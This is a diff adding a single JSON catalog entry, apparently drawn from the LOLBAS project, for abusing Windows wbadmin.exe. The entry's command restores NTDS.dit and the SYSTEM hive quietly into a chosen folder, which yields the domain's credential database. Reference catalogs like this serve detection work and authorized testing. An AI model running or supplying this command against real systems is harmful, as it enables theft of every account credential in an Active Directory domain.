@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-wbadmin-exe-dump-2",
+  "name": "LOLBAS · wbadmin.exe (Dump) #2",
+  "command": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet",
+  "description": "Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "wbadmin",
+    "dump"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/wbadmin/",
+  "upstream_id": "wbadmin.exe/Dump/1",
+  "category": "lolbas",
+  "subcategory": "dump",
+  "references": [
+    {
+      "title": "LOLBAS — wbadmin.exe",
+      "url": "https://lolbas-project.github.io/lolbas/wbadmin/"
+    }
+  ]
+}
